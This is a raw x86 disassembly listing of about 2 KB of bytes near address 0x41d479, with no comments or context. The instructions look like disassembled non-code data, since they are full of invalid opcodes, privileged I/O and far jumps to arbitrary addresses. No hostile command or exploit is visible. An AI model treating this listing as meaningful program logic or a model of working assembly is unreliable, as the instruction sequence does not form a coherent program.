  41d479:	data16 jb 0x41d4a2
  41d47c:	pop    ds
  41d47d:	div    BYTE PTR [ecx]
  41d47f:	enter  0xe744,0xce
  41d483:	xor    DWORD PTR [edx+0x4f1da3f2],esp
  41d489:	mov    ebx,0xa5adf29
  41d48e:	add    esi,DWORD PTR [edi+0x3c]
  41d491:	lock adc BYTE PTR ds:0xf78d99f,0x83
  41d499:	push   ds
  41d49a:	fnstcw WORD PTR [eax]
  41d49c:	into   
  41d49d:	mov    bh,0xdd
  41d49f:	(bad)  
  41d4a0:	clc    
  41d4a1:	lods   eax,DWORD PTR ds:[esi]
  41d4a2:	pop    ebx
  41d4a3:	mov    al,ds:0x3a1b038f
  41d4a8:	mov    dl,0xe6
  41d4aa:	imul   dl
  41d4ac:	pop    es
  41d4ad:	(bad)  
  41d4ae:	out    dx,eax
  41d4af:	adc    edx,DWORD PTR [ecx]
  41d4b1:	fstp   QWORD PTR [esi+0x3]
  41d4b4:	dec    eax
  41d4b5:	popf   
  41d4b6:	add    DWORD PTR [esi],eax
  41d4b8:	popf   
  41d4b9:	outs   dx,BYTE PTR es:[esi]
  41d4bb:	cmp    cl,BYTE PTR [ebx+0x74]
  41d4be:	stos   BYTE PTR es:[edi],al
  41d4bf:	arpl   WORD PTR [ecx-0x3e],cx
  41d4c2:	test   bl,ah
  41d4c4:	lock icebp 
  41d4c6:	(bad)  
  41d4c7:	in     al,dx
  41d4c8:	mov    ebp,0xe597fc69
  41d4cd:	mov    esi,DWORD PTR [edx]
  41d4cf:	fsub   st(7),st
  41d4d1:	inc    ebx
  41d4d2:	outs   dx,DWORD PTR ds:[esi]
  41d4d3:	or     ebx,DWORD PTR [eax+0x3390cacf]
  41d4d9:	(bad)  
  41d4da:	push   ss
  41d4db:	aaa    
  41d4dc:	scas   eax,DWORD PTR es:[edi]
  41d4dd:	(bad)  
  41d4de:	hlt    
  41d4df:	xchg   ebx,eax
  41d4e0:	push   edi
  41d4e1:	mov    ds:0x6d999c43,al
  41d4e6:	pop    esi
  41d4e7:	fcom   DWORD PTR [eax-0x59e073f5]
  41d4ed:	dec    ebp
  41d4ee:	mov    DWORD PTR [edx+0x5b08546c],edx
  41d4f4:	xor    cl,BYTE PTR [esi+0x180e614e]
  41d4fa:	pop    edi
  41d4fb:	jp     0x41d497
  41d4fd:	pop    edi
  41d4fe:	inc    edx
  41d4ff:	jg     0x41d534
  41d501:	xchg   esp,eax
  41d502:	call   0xf89e487c
  41d507:	pop    ss
  41d508:	xchg   ebx,eax
  41d509:	xor    edx,edi
  41d50b:	enter  0x279b,0xee
  41d50f:	int3   
  41d510:	adc    ebp,ebx
  41d512:	sbb    edi,DWORD PTR ds:0xb40db66e
  41d518:	mov    dl,0x5f
  41d51a:	sub    bl,cl
  41d51c:	cs int 0x89
  41d51f:	xchg   ebx,eax
  41d520:	or     esp,DWORD PTR [ecx-0x5e]
  41d523:	dec    eax
  41d524:	test   DWORD PTR [ebx],edi
  41d526:	jp     0x41d584
  41d528:	out    0x1d,al
  41d52a:	inc    edi
  41d52b:	and    BYTE PTR [eax+edi*2],bh
  41d52e:	lahf   
  41d52f:	ret    0x9bf6
  41d532:	scas   eax,DWORD PTR es:[edi]
  41d533:	jmp    0xc2ed:0xb45c6413
  41d53a:	call   0x271f:0x29499d15
  41d541:	add    al,0x14
  41d543:	xor    BYTE PTR [esi],bl
  41d545:	add    BYTE PTR [edx+0x49],ah
  41d548:	inc    esi
  41d549:	pusha  
  41d54a:	rcl    DWORD PTR [esi+0x30c1e3fe],1
  41d550:	fidiv  WORD PTR [ecx]
  41d552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d553:	pop    ecx
  41d554:	mov    bh,0xd7
  41d556:	mov    cl,0xb
  41d558:	vcvtsi2ss xmm5,xmm0,ebx
  41d55c:	test   al,0x6e
  41d55e:	and    eax,0x1ef78fe6
  41d563:	fist   DWORD PTR [ecx+ebx*1]
  41d566:	dec    edx
  41d567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d568:	cmc    
  41d569:	out    0x5c,eax
  41d56b:	push   cs
  41d56c:	adc    esi,esp
  41d56e:	and    al,BYTE PTR [eax+0x55]
  41d571:	fld    TBYTE PTR [eax-0x47]
  41d574:	pop    ecx
  41d575:	xor    BYTE PTR [esi+0x78],dl
  41d578:	pushf  
  41d579:	pusha  
  41d57a:	std    
  41d57b:	aas    
  41d57c:	scas   eax,DWORD PTR es:[edi]
  41d57d:	jmp    0xdb979d23
  41d582:	or     ah,BYTE PTR [ebx-0x1f]
  41d585:	mov    ecx,0x2f22d873
  41d58a:	out    0xa0,eax
  41d58c:	stos   DWORD PTR es:[edi],eax
  41d58d:	mov    esp,esi
  41d58f:	out    dx,al
  41d590:	inc    edx
  41d591:	or     ch,BYTE PTR [ebx-0x67401f25]
  41d597:	cmp    ch,al
  41d599:	test   al,0x5d
  41d59b:	push   ds
  41d59c:	call   0x83540c0d
  41d5a1:	or     DWORD PTR [ebx+edi*2+0x4ba924d3],edi
  41d5a8:	fbld   TBYTE PTR [esi+0x9]
  41d5ab:	outs   dx,DWORD PTR ds:[esi]
  41d5ac:	loop   0x41d5a6
  41d5ae:	push   esi
  41d5af:	add    BYTE PTR [ecx-0x66914ab2],al
  41d5b5:	cdq    
  41d5b6:	sub    al,0x63
  41d5b8:	jo     0x41d5be
  41d5ba:	fwait
  41d5bb:	mov    dl,BYTE PTR [eax+ecx*8+0x5f]
  41d5bf:	xchg   cl,ch
  41d5c1:	sub    edx,DWORD PTR [ecx]
  41d5c3:	pop    ebp
  41d5c4:	sub    esi,DWORD PTR [ebx+0x2700d41a]
  41d5ca:	add    eax,eax
  41d5cc:	enter  0xac94,0x78
  41d5d0:	imul   esi,esp,0x37cb97fd
  41d5d6:	sub    DWORD PTR [ecx+0x39da27f9],ecx
  41d5dc:	jmp    0xcbeb38bf
  41d5e1:	cmp    eax,0x62d0746e
  41d5e7:	xor    al,0xd6
  41d5e9:	dec    edi
  41d5ea:	enter  0xc9b8,0x28
  41d5ee:	cmp    dh,BYTE PTR [esi-0x224b4ba3]
  41d5f4:	sub    BYTE PTR [esi+0x9],bh
  41d5f7:	ficom  WORD PTR [edx]
  41d5f9:	push   0x69
  41d5fb:	jmp    0x554b:0xad1bc097
  41d602:	rcr    DWORD PTR [edi+0x4b83248d],0xde
  41d609:	scas   al,BYTE PTR es:[edi]
  41d60a:	sbb    eax,0xdd6c5696
  41d60f:	push   cs
  41d610:	or     DWORD PTR [edi-0x16],edx
  41d613:	retf   
  41d614:	sbb    DWORD PTR [esp+ebx*8],0xb
  41d618:	adc    DWORD PTR [ecx+0x27573744],edi
  41d61e:	mov    bh,0x7
  41d620:	mov    esi,0x3b8564a3
  41d625:	jle    0x41d66c
  41d627:	mov    ah,0xaa
  41d629:	bound  ecx,QWORD PTR [edi+0x1f3f023]
  41d62f:	sub    eax,0xd54a38c0
  41d634:	push   ebp
  41d635:	ds dec ebx
  41d637:	js     0x41d5c1
  41d639:	push   0xfc68325
  41d63e:	dec    eax
  41d63f:	or     DWORD PTR [esi+0x2b452361],ebx
  41d645:	mov    DWORD PTR [edx+0x6822a0da],edx
  41d64b:	and    al,0xa
  41d64d:	adc    al,0x8e
  41d64f:	imul   ebp,DWORD PTR ds:0xb696d408,0xffffffc5
  41d656:	test   DWORD PTR [ecx],edi
  41d658:	jmp    0x41d65e
  41d65a:	fwait
  41d65b:	and    al,BYTE PTR [ebp+0x3]
  41d65e:	shr    DWORD PTR [ecx-0x14],cl
  41d661:	mov    ds:0xfcb48741,al
  41d666:	sbb    ch,cl
  41d668:	lea    esi,[edx]
  41d66a:	out    0x2c,al
  41d66c:	imul   edx
  41d66e:	dec    esp
  41d66f:	xor    BYTE PTR [edi+0x4e],0x51
  41d673:	loope  0x41d63d
  41d675:	add    ah,BYTE PTR [ebx]
  41d677:	rcr    eax,0x44
  41d67a:	xor    dl,BYTE PTR [ebx+0x3e]
  41d67d:	shl    DWORD PTR [esi-0x6e],0x28
  41d681:	inc    esp
  41d682:	pop    ds
  41d683:	mov    ds:0x80c04cd3,eax
  41d688:	daa    
  41d689:	push   ss
  41d68a:	push   es
  41d68b:	adc    BYTE PTR [ebp+0xf],bl
  41d68e:	data16 mov ah,0x8f
  41d691:	xor    ebp,DWORD PTR [eax-0x6b]
  41d694:	jb     0x41d64d
  41d696:	loop   0x41d68c
  41d698:	push   es
  41d699:	jge    0x41d63c
  41d69b:	pop    ebx
  41d69c:	adc    al,BYTE PTR [ebp-0x7f0cbb4d]
  41d6a2:	out    dx,al
  41d6a3:	popa   
  41d6a4:	loope  0x41d724
  41d6a6:	jmp    0x41d6c4
  41d6a8:	push   ebx
  41d6a9:	pop    es
  41d6aa:	outs   dx,BYTE PTR ds:[esi]
  41d6ab:	add    BYTE PTR [esp+ecx*4-0x73],al
  41d6af:	les    edi,FWORD PTR [edi-0x59102447]
  41d6b5:	scas   eax,DWORD PTR es:[edi]
  41d6b6:	inc    esp
  41d6b7:	out    0x2b,eax
  41d6b9:	mov    al,ds:0x6d8af61c
  41d6be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6bf:	inc    edi
  41d6c0:	inc    esi
  41d6c1:	mov    WORD PTR [ebx+ecx*2+0x6f],?
  41d6c5:	data16 test al,0xfb
  41d6c8:	dec    ebp
  41d6c9:	or     bl,bh
  41d6cb:	and    esi,DWORD PTR [ebx+eiz*4+0x38]
  41d6cf:	loop   0x41d6a8
  41d6d1:	dec    ebx
  41d6d2:	or     ch,BYTE PTR ds:0x9f0f3962
  41d6d8:	repnz ror BYTE PTR [edi-0x42],1
  41d6dc:	mov    BYTE PTR [ebx-0x14],al
  41d6df:	ins    BYTE PTR es:[edi],dx
  41d6e0:	add    DWORD PTR [ebx-0x4c],ebp
  41d6e3:	pop    ebx
  41d6e4:	loope  0x41d760
  41d6e6:	jp     0x41d694
  41d6e8:	push   0x3ec4540e
  41d6ed:	sbb    eax,0xcd5da970
  41d6f2:	das    
  41d6f3:	or     dh,dl
  41d6f5:	cmp    al,0x59
  41d6f7:	jbe    0x41d714
  41d6f9:	or     ah,BYTE PTR [edx+0x6bc170a2]
  41d6ff:	and    DWORD PTR [edi+esi*1+0x24],ebp
  41d703:	dec    ebx
  41d704:	xchg   BYTE PTR [edi+0x2dc34c9],al
  41d70a:	aas    
  41d70b:	jl     0x41d6ea
  41d70d:	sti    
  41d70e:	mov    al,ds:0xeb32ec7e
  41d713:	in     eax,dx
  41d714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d715:	xchg   DWORD PTR [edi+0x2a],eax
  41d718:	iret   
  41d719:	call   0xe1631cc0
  41d71e:	dec    esi
  41d71f:	lea    edx,[ebx]
  41d721:	push   0x15dacbe4
  41d726:	lea    esi,[esi+0x8]
  41d729:	mov    WORD PTR [eax+0x17123a15],cs
  41d72f:	mov    ebp,0x3513e9c9
  41d734:	push   esi
  41d735:	sbb    ah,BYTE PTR [eax+0x55]
  41d738:	cmc    
  41d739:	dec    ebp
  41d73a:	call   0x7cdb:0x6bcc649
  41d741:	sbb    al,0xff
  41d743:	in     al,dx
  41d744:	imul   BYTE PTR [ebx-0x17817216]
  41d74a:	outs   dx,BYTE PTR ds:[esi]
  41d74b:	and    al,0xe
  41d74d:	add    DWORD PTR [ecx+0x75],0xc592a27d
  41d754:	aad    0x81
  41d756:	jg     0x41d720
  41d758:	pop    eax
  41d759:	jae    0x41d7d6
  41d75b:	sub    al,0x3c
  41d75d:	ins    DWORD PTR es:[edi],dx
  41d75e:	sbb    edx,edx
  41d760:	daa    
  41d761:	mov    DWORD PTR [ebx],edi
  41d763:	dec    BYTE PTR [eax-0x7c42bfbe]
  41d769:	cmp    BYTE PTR [edx],al
  41d76b:	popa   
  41d76c:	popf   
  41d76d:	and    dl,bh
  41d76f:	pop    ebp
  41d770:	dec    ebx
  41d771:	ins    WORD PTR es:[edi],dx
  41d773:	cdq    
  41d774:	or     DWORD PTR [eax+0x77],ebp
  41d777:	add    ah,dl
  41d779:	dec    eax
  41d77a:	pop    esi
  41d77b:	(bad)  
  41d77c:	aad    0xb2
  41d77e:	mov    al,0xd1
  41d780:	add    BYTE PTR [ebp+0xb],bl
  41d783:	push   cs
  41d784:	pop    edi
  41d785:	fstp   DWORD PTR [edx+eax*8+0x2eaaeef1]
  41d78c:	jns    0x41d7a0
  41d78e:	sub    al,0x25
  41d790:	fadd   DWORD PTR [edi+0x2b]
  41d793:	sahf   
  41d794:	in     eax,dx
  41d795:	jg     0x41d7e4
  41d797:	cmp    DWORD PTR [ebx-0x71],0x76
  41d79b:	inc    edx
  41d79c:	sbb    eax,0xa528e01
  41d7a1:	adc    al,0x95
  41d7a3:	in     eax,0x33
  41d7a5:	or     eax,DWORD PTR [ebx+0x12]
  41d7a8:	outs   dx,BYTE PTR ds:[esi]
  41d7a9:	sti    
  41d7aa:	sbb    ch,BYTE PTR [edx-0x3f821b87]
  41d7b0:	stos   DWORD PTR es:[edi],eax
  41d7b1:	and    al,BYTE PTR [ecx-0x34]
  41d7b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7b5:	cmp    eax,0x54b9839f
  41d7ba:	sbb    esp,ecx
  41d7bc:	and    al,0x56
  41d7be:	dec    esp
  41d7bf:	pop    ds
  41d7c0:	jp     0x41d74f
  41d7c2:	outs   dx,BYTE PTR ds:[esi]
  41d7c3:	or     BYTE PTR [edx+0x60],dl
  41d7c6:	(bad)  
  41d7c7:	rcr    al,1
  41d7c9:	ins    BYTE PTR es:[edi],dx
  41d7ca:	cmp    al,0xc2
  41d7cc:	jle    0x41d76b
  41d7ce:	pop    es
  41d7cf:	push   ss
  41d7d0:	test   eax,0x25da1321
  41d7d5:	jns    0x41d7cd
  41d7d7:	mov    bl,0x4f
  41d7d9:	rol    ecx,1
  41d7db:	jb     0x41d78a
  41d7dd:	(bad)  
  41d7de:	sbb    ecx,DWORD PTR [ebp+0xaa6b0fc]
  41d7e4:	fidivr WORD PTR [edx+ecx*4+0x71]
  41d7e8:	rcl    DWORD PTR [eax],1
  41d7ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7eb:	mov    ch,0x64
  41d7ed:	xor    esp,DWORD PTR [ebx+0x27]
  41d7f0:	adc    ah,BYTE PTR [esi-0x63]
  41d7f3:	jle    0x41d82d
  41d7f5:	cmp    edx,DWORD PTR [esi]
  41d7f7:	and    eax,0xbefd4753
  41d7fc:	dec    esp
  41d7fd:	jmp    0x8ba1afac
  41d802:	cmp    al,0x6e
  41d804:	xor    eax,0xa20b8cde
  41d809:	cdq    
  41d80a:	xchg   esp,eax
  41d80b:	stos   BYTE PTR es:[edi],al
  41d80c:	sar    BYTE PTR [esi+0x1b65bc50],1
  41d812:	jge    0x41d80a
  41d814:	pop    esi
  41d815:	test   eax,0xeddc3ffc
  41d81a:	push   ecx
  41d81b:	xchg   esi,eax
  41d81c:	(bad)  [esi]
  41d81e:	pop    esp
  41d81f:	jmp    esp
  41d821:	push   ds
  41d822:	jmp    0x95ebd51b
  41d827:	jae    0x41d7b6
  41d829:	pop    esi
  41d82a:	push   eax
  41d82b:	mov    bh,0xb8
  41d82d:	std    
  41d82e:	sub    eax,0xf18cbaa5
  41d833:	cs fs in eax,dx
  41d836:	shl    BYTE PTR [ebx-0x11],0x53
  41d83a:	dec    esp
  41d83b:	xor    eax,0xc6b853d8
  41d840:	jmp    0xb5ebcc25
  41d845:	es (bad) 
  41d847:	jns    0x41d8bb
  41d849:	mov    ecx,0x1e3f0cab
  41d84e:	jle    0x41d880
  41d850:	jmp    0x68c:0x65b1b4a5
  41d857:	ss ret 
  41d859:	sub    DWORD PTR [ebx+0x61],0x97d4d3d5
  41d860:	imul   eax,DWORD PTR [edi+0x21593ca8],0xf9a8a84a
  41d86a:	stos   BYTE PTR es:[edi],al
  41d86b:	pop    ebx
  41d86c:	inc    edx
  41d86d:	mov    bh,0xb2
  41d86f:	pop    ecx
  41d870:	test   eax,0xa990646f
  41d875:	repz xor ebx,DWORD PTR [edx-0x6b]
  41d879:	push   cs
  41d87a:	pusha  
  41d87b:	mov    cl,0x26
  41d87d:	add    al,0x4e
  41d87f:	shl    DWORD PTR [edi-0x2236369c],1
  41d885:	pop    edx
  41d886:	pop    esi
  41d887:	xchg   ebp,eax
  41d888:	neg    BYTE PTR [eax+0x62b47cc2]
  41d88e:	(bad)  
  41d88f:	gs icebp 
  41d891:	pop    esp
  41d892:	cmp    DWORD PTR ds:0xebfa3fc5,0x49
  41d899:	ss dec esi
  41d89b:	mov    DWORD PTR [edx],edi
  41d89d:	and    eax,0x6a780342
  41d8a2:	popa   
  41d8a3:	out    0xb1,al
  41d8a5:	mov    ebp,0x5150a6de
  41d8aa:	inc    esp
  41d8ab:	jns    0x41d878
  41d8ad:	mov    ds:0x413bd24e,eax
  41d8b2:	sar    BYTE PTR [eax-0x27],1
  41d8b5:	jp     0x41d8aa
  41d8b7:	das    
  41d8b8:	pushf  
  41d8b9:	push   0x8113d38d
  41d8be:	pop    edx
  41d8bf:	inc    esp
  41d8c0:	sbb    BYTE PTR [edi+0x78],bh
  41d8c3:	xor    DWORD PTR [ebx+ebx*8+0xe],ebx
  41d8c7:	adc    BYTE PTR [ecx+ecx*1],al
  41d8ca:	or     ch,BYTE PTR [ecx+esi*4]
  41d8cd:	daa    
  41d8ce:	pop    ebx
  41d8cf:	aaa    
  41d8d0:	xchg   ebp,eax
  41d8d1:	xor    eax,0xb0ca206a
  41d8d6:	cli    
  41d8d7:	xchg   ebx,eax
  41d8d8:	xor    eax,0x484b49e5
  41d8dd:	out    0xb,eax
  41d8df:	mov    ah,0x2a
  41d8e1:	hlt    
  41d8e2:	xchg   edx,eax
  41d8e3:	ret    0xe7b9
  41d8e6:	in     eax,dx
  41d8e7:	dec    BYTE PTR [edi]
  41d8e9:	inc    edi
  41d8ea:	add    DWORD PTR [ebx],eax
  41d8ec:	cwde   
  41d8ed:	pop    edi
  41d8ee:	inc    ecx
  41d8ef:	(bad)  
  41d8f0:	xchg   ebp,eax
  41d8f1:	fcom   DWORD PTR [ebx+0x13]
  41d8f4:	inc    bh
  41d8f6:	sub    eax,DWORD PTR [edx+0x4e3f12a1]
  41d8fc:	(bad)  ds:0x3d35ee6
  41d902:	mov    ds:0x2acc739e,al
  41d907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d908:	les    ecx,FWORD PTR [esi]
  41d90a:	sbb    al,0x77
  41d90c:	mov    esi,0xc4a171c2
  41d911:	jge    0x41d8b9
  41d913:	and    DWORD PTR [ebx-0x7c],eax
  41d916:	inc    esp
  41d917:	xchg   esi,eax
  41d918:	jg     0x41d95a
  41d91a:	shl    bh,cl
  41d91c:	jge    0x41d983
  41d91e:	cmp    BYTE PTR [ecx],dl
  41d920:	data16 js 0x41d8c4
  41d923:	jbe    0x41d8c4
  41d925:	push   0xe7551
  41d92a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d92b:	xchg   ebx,eax
  41d92c:	div    BYTE PTR [eax+0x31226054]
  41d932:	jl     0x41d926
  41d934:	lods   eax,DWORD PTR ds:[esi]
  41d935:	scas   eax,DWORD PTR es:[edi]
  41d936:	ds aas 
  41d938:	lds    edx,FWORD PTR ds:0xa9eaf345
  41d93e:	outs   dx,DWORD PTR ds:[esi]
  41d93f:	scas   al,BYTE PTR es:[edi]
  41d940:	or     eax,0x69d90ab5
  41d945:	loopne 0x41d969
  41d947:	sbb    al,0x6b
  41d949:	push   ebx
  41d94a:	lods   eax,DWORD PTR ds:[esi]
  41d94b:	out    0x78,al
  41d94d:	add    al,0xf4
  41d94f:	mov    esi,0xf53bcf71
  41d954:	xchg   edi,eax
  41d955:	xchg   ebp,eax
  41d956:	jb     0x41d9a1
  41d958:	(bad)  
  41d959:	rcr    edx,0x33
  41d95c:	call   0x396d5eeb
  41d961:	mov    ecx,0x1c133360
  41d966:	dec    ebx
  41d967:	adc    BYTE PTR [esi+0x1],al
  41d96a:	cwde   
  41d96b:	sbb    bh,BYTE PTR [esi+ebp*8+0x2c]
  41d96f:	jnp    0x41d90f
  41d971:	inc    esi
  41d972:	add    BYTE PTR [ecx+0x27],cl
  41d975:	pop    edx
  41d976:	sbb    DWORD PTR [edx],0xffffff9c
  41d979:	int    0x5d
  41d97b:	test   DWORD PTR [ecx-0x42525653],0xf1961ca5
  41d985:	dec    ebx
  41d986:	ficomp WORD PTR [ebx]
  41d988:	mov    ebx,0x1c8fc635
  41d98d:	pop    ss
  41d98e:	fadd   st(4),st
  41d990:	jle    0x41d9e7
  41d992:	adc    esp,DWORD PTR [esi+ebp*2-0x714a3b71]
  41d999:	dec    edx
  41d99a:	pop    ds
  41d99b:	jb     0x41d93a
  41d99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99e:	pusha  
  41d99f:	sbb    eax,0xad9368a9
  41d9a4:	ds aad 0xd4
  41d9a7:	(bad)  
  41d9aa:	xor    edi,edi
  41d9ac:	mov    eax,0xfb21c23e
  41d9b1:	imul   ebp,DWORD PTR [ebx+edx*2-0x70],0x396dad44
  41d9b9:	mov    bh,0x64
  41d9bb:	jle    0x41d983
  41d9bd:	and    DWORD PTR [esp+edx*4-0x3],0x2c21bb4c
  41d9c5:	cmp    ecx,ebx
  41d9c7:	test   DWORD PTR [ebx],ebx
  41d9c9:	test   al,0xe7
  41d9cb:	lods   al,BYTE PTR ds:[esi]
  41d9cc:	enter  0xb9e5,0xaf
  41d9d0:	les    ebx,FWORD PTR [eax+0x2a]
  41d9d3:	xlat   BYTE PTR ds:[ebx]
  41d9d4:	mov    ecx,0x3df2c07b
  41d9d9:	ins    BYTE PTR es:[edi],dx
  41d9da:	mov    eax,0xa4e2b613
  41d9df:	cmp    DWORD PTR [ebx],0x6091ce0a
  41d9e5:	xchg   esi,eax
  41d9e6:	cmp    eax,0x661567b1
  41d9eb:	dec    eax
  41d9ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ed:	enter  0xe685,0xee
  41d9f1:	add    eax,0x8e23547
  41d9f6:	mov    eax,0xa79d49aa
  41d9fb:	cmp    edi,DWORD PTR [ebx+0x29308dd4]
  41da01:	cmp    BYTE PTR [edi+0x99b0d45],dh
  41da07:	dec    DWORD PTR [esi+0x64]
  41da0a:	ret    0x4028
  41da0d:	hlt    
  41da0e:	cld    
  41da0f:	mov    ecx,0xbded6436
  41da14:	shl    DWORD PTR [eax-0x668ebf7f],1
  41da1a:	or     ebx,DWORD PTR [ebp+0x65]
  41da1d:	or     eax,0xda8ad1bd
  41da22:	xor    DWORD PTR [eax],esi
  41da24:	mov    dl,0xea
  41da26:	xor    bh,BYTE PTR [edx-0x856d514]
  41da2c:	pop    esi
  41da2d:	jmp    0x4c3f:0x6cb2faa0
  41da34:	std    
  41da35:	sub    al,0xc9
  41da37:	cwde   
  41da38:	push   ds
  41da39:	fsubrp st(2),st
  41da3b:	icebp  
  41da3c:	push   ds
  41da3d:	or     ebp,ecx
  41da3f:	sbb    esi,DWORD PTR [esi+0x62ff2b4c]
  41da45:	jge    0x41da96
  41da47:	stos   DWORD PTR es:[edi],eax
  41da48:	or     DWORD PTR [ebx-0xcf183c3],0xffffffdd
  41da4f:	and    bl,BYTE PTR ds:0xa040a1a9
  41da55:	xor    ebp,DWORD PTR [ecx+0x2614b957]
  41da5b:	(bad)  
  41da5c:	mov    al,0x7a
  41da5e:	dec    eax
  41da5f:	mov    es,WORD PTR [ebp+0x10]
  41da62:	or     DWORD PTR [ebp-0x3a],ebx
  41da65:	sub    al,0xa4
  41da67:	xor    dh,ch
  41da69:	jb     0x41dac8
  41da6b:	loop   0x41da99
  41da6d:	ret    
  41da6e:	call   0x28764b5b
  41da73:	ja     0x41da0c
  41da75:	ss sub al,dl
  41da78:	dec    ebx
  41da79:	sub    bh,BYTE PTR [edi-0x51]
  41da7c:	paddd  mm0,QWORD PTR [esi+esi*2]
  41da80:	(bad)  
  41da81:	jl     0x41da33
  41da83:	inc    ecx
  41da84:	xlat   BYTE PTR ds:[ebx]
  41da85:	cmp    esp,DWORD PTR [edx]
  41da87:	sub    DWORD PTR [edi+0x4b35fe88],esi
  41da8d:	inc    ebx
  41da8e:	popa   
  41da8f:	mov    cl,BYTE PTR [edx-0x5c]
  41da92:	popa   
  41da93:	xor    DWORD PTR [eax+0x5b],ebp
  41da96:	scas   al,BYTE PTR es:[edi]
  41da97:	daa    
  41da98:	cmc    
  41da99:	adc    ah,ah
  41da9b:	cmp    cl,BYTE PTR [ecx+0x38]
  41da9e:	neg    DWORD PTR [ebx+0x662f765a]
  41daa4:	(bad)  
  41daa5:	sbb    BYTE PTR [edx],bh
  41daa7:	pop    ebx
  41daa8:	in     al,dx
  41daa9:	daa    
  41daaa:	in     eax,dx
  41daab:	add    al,0x2a
  41daad:	adc    DWORD PTR [eax-0x52],edi
  41dab0:	int    0x3b
  41dab2:	jno    0x41dadd
  41dab4:	jmp    0x1196:0x3f7591f1
  41dabb:	mov    eax,ds:0xb0d4a81c
  41dac0:	add    al,0x55
  41dac2:	sbb    DWORD PTR [ebx],ebp
  41dac4:	mov    bl,0xe2
  41dac6:	adc    BYTE PTR ds:0xfa60e349,bh
  41dacc:	es xchg ebx,eax
  41dace:	aaa    
  41dacf:	out    0x3a,al
  41dad1:	fs popf 
  41dad3:	ins    DWORD PTR es:[edi],dx
  41dad4:	push   ecx
  41dad5:	cld    
  41dad6:	pop    ebx
  41dad7:	and    ah,bh
  41dad9:	inc    eax
  41dada:	xchg   esi,eax
  41dadb:	adc    bl,BYTE PTR [eax+0x36]
  41dade:	sti    
  41dadf:	add    eax,0xf5a31e5c
  41dae4:	jl     0x41daae
  41dae6:	add    al,0xda
  41dae8:	adc    DWORD PTR [esi],0xffffffed
  41daeb:	dec    esp
  41daec:	push   esp
  41daed:	dec    edi
  41daee:	inc    edx
  41daef:	add    DWORD PTR ds:0x84f885c0,eax
  41daf5:	mov    dl,0x7b
  41daf7:	call   0x6cd2ae0
  41dafc:	xor    ecx,esi
  41dafe:	fld    DWORD PTR [eax-0x25142b49]
  41db04:	cwde   
  41db05:	pusha  
  41db06:	sbb    al,0x3
  41db08:	popa   
  41db09:	es cmp esi,edx
  41db0c:	daa    
  41db0d:	stos   DWORD PTR es:[edi],eax
  41db0e:	sbb    ebx,edx
  41db10:	or     esp,esi
  41db12:	into   
  41db13:	push   cs
  41db14:	mov    dl,0xe4
  41db16:	aad    0xe6
  41db18:	add    BYTE PTR [edx+eax*8-0x202f4dee],0x60
  41db20:	rol    BYTE PTR [ecx],0xf7
  41db23:	inc    ecx
  41db24:	adc    ebp,edx
  41db26:	mov    esi,0xda693310
  41db2b:	jmp    FWORD PTR [eax-0x2b]
  41db2e:	and    al,0x2
  41db30:	out    dx,al
  41db31:	mov    ch,0xe7
  41db33:	fdiv   QWORD PTR [ecx+edi*2-0x13]
  41db37:	pop    ebp
  41db38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db39:	sti    
  41db3a:	adc    ah,BYTE PTR [ebx+edx*2+0xa13d60b]
  41db41:	clc    
  41db42:	shl    BYTE PTR [edi+0x21],cl
  41db45:	mov    ebp,0xb65b5205
  41db4a:	mov    al,0x26
  41db4c:	(bad)  
  41db4e:	fild   DWORD PTR ds:0x89cb3c0c
  41db54:	leave  
  41db55:	mov    BYTE PTR [ebp-0x32],bh
  41db58:	in     eax,0xb4
  41db5a:	or     ebx,esp
  41db5c:	std    
  41db5d:	iret   
  41db5e:	sbb    eax,0x63780522
  41db63:	push   edi
  41db64:	cwde   
  41db65:	pop    edx
  41db66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db67:	xchg   esi,eax
  41db68:	jle    0x41dafa
  41db6a:	sti    
  41db6b:	push   eax
  41db6c:	add    DWORD PTR [eax+ebp*8],0xde2c0b39
  41db73:	pop    ebp
  41db74:	ret    
  41db75:	and    eax,edi
  41db77:	mov    bl,0x61
  41db79:	xchg   esp,esi
  41db7b:	lock mov WORD PTR [ebx-0x7f],gs
  41db7f:	xchg   edx,eax
  41db80:	ficom  DWORD PTR ds:0xee95ca3a
  41db86:	icebp  
  41db87:	cld    
  41db88:	aas    
  41db89:	ins    BYTE PTR es:[edi],dx
  41db8a:	lds    esi,FWORD PTR [eax]
  41db8c:	rol    DWORD PTR [ebp+0x5e],0xa8
  41db90:	daa    
  41db91:	int3   
  41db92:	dec    esi
  41db93:	ins    DWORD PTR es:[edi],dx
  41db94:	cwde   
  41db95:	and    eax,0x1eb244f4
  41db9a:	cli    
  41db9b:	jl     0x41db34
  41db9d:	lds    esi,FWORD PTR [eax-0xd]
  41dba0:	push   0x58ad5a14
  41dba5:	adc    al,0xcf
  41dba7:	xor    ebp,esi
  41dba9:	shl    DWORD PTR [edi+0xd],0xc8
  41dbad:	in     al,dx
  41dbae:	and    DWORD PTR [eax],esi
  41dbb0:	imul   esp,eax,0x28
  41dbb3:	xchg   ecx,eax
  41dbb4:	mov    ch,0x19
  41dbb6:	mov    eax,0x6ea3cb03
  41dbbb:	ret    
  41dbbc:	or     cl,BYTE PTR [edx+ebx*8-0x3d]
  41dbc0:	fldcw  WORD PTR [ecx-0x12]
  41dbc3:	xchg   ebx,eax
  41dbc4:	xchg   ebx,eax
  41dbc5:	jge    0x41dc0e
  41dbc7:	fdiv   DWORD PTR [esi]
  41dbc9:	ins    DWORD PTR es:[edi],dx
  41dbca:	cwde   
  41dbcb:	lods   eax,DWORD PTR ds:[esi]
  41dbcc:	push   edi
  41dbcd:	je     0x41dc24
  41dbcf:	(bad)  [edx-0x479ae2b3]
  41dbd5:	stos   BYTE PTR es:[edi],al
